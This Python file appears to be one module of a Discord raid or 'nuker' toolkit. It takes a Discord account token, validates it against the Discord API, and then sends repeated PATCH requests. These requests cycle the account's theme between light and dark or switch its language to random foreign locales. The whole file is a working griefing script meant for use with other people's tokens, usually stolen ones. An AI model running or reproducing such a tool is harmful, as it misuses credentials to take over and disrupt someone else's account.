import time
import os
import requests
import random
from colorama import Fore
from util.plugins.commun import * 

def settingstheme():
    setTitle("Settings Changer")
    clear()
    settingscyclertitle()

    print(f"""{y}[{Fore.LIGHTBLUE_EX }#{y}]{w} You can change:\n          {y}[{w}1{y}]{w} Color Theme\n          {y}[{w}2{y}]{w} Language\n\n""")
    choice = input(f"""{y}[{Fore.LIGHTBLUE_EX }#{y}]{w} Setting to change: """)

    if choice == "1":
        print(f"""{y}[{w}+{y}]{w} Enter the token of the account you want to Cycle Color theme""")
        token = input(f"""{y}[{b}#{y}]{w} Token: """)

        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        if r.status_code == 200:
            print(f"""\n{y}[{w}+{y}]{w} Enter the number of cycles : """)
            amount = int(input(f"""{y}[{b}#{y}]{w} Amount: """))
            print()
            from itertools import cycle
            modes = cycle(["light", "dark"])
            clear()
            for i in range(amount):
                print(f"""{y}[{Fore.LIGHTGREEN_EX }{i+1}{y}]{w} Theme Color has been changed""")
                time.sleep(0.5)
                setting = {'theme': next(modes)}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
            clear()
            settingscyclertitle()
            print(f"""{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Cycle successfully completed""")
            input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")
            main()
        else:
          print(f"""          {y}[{Fore.LIGHTRED_EX }#{y}]{w} Invalid token""")
          input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
          main()

    elif choice == "2":
        print(f"""{y}[{w}+{y}]{w} Enter the token of the account you want to Cycle Language""")
        token = input(f"""{y}[{b}#{y}]{w} Token: """)

        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        if r.status_code == 200:
            print(f"""\n{y}[{w}+{y}]{w} Enter the number of cycles : """)
            amount = int(input(f"""{y}[{b}#{y}]{w} Amount: """))
            print()
            clear()
            for i in range(amount):
                print(f"""{y}[{Fore.LIGHTGREEN_EX }{i+1}{y}]{w} Language has been changed""")
                time.sleep(1)
                setting = {'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
            clear()
            settingscyclertitle()
            print(f"""{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Cycle successfully completed""")
            input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")
            main()
        else:
          print(f"""          {y}[{Fore.LIGHTRED_EX }#{y}]{w} Invalid token""")
          input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
          main()
    else:
        print(f"""          {y}[{Fore.LIGHTRED_EX }#{y}]{w} Invalid choice""")
        input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
        main()
          
settingstheme()
